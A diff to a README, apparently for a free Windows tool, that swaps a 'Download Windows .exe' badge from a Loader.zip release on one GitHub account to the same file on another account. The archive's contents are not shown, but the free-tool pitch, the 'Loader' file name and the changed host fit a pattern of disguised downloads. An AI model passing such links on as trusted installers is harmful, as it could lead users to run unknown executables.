@@ -9,7 +9,7 @@ No credits. No subscription. No queue.
 
 **English** · [中文](README.zh-CN.md)
 
-[![Download](https://img.shields.io/badge/Download-Windows%20.exe-0066CC?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/BlazeKazekage/release/releases/download/1/Loader.zip)
+[![Download](https://img.shields.io/badge/Download-Windows%20.exe-0066CC?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/PrismMonitorPlan/release/releases/download/1/Loader.zip)
 [![Website](https://img.shields.io/badge/Website-open-111113?style=for-the-badge)](https://promptreel.xo.je/)
 
 ![Free](https://img.shields.io/badge/price-free-brightgreen)
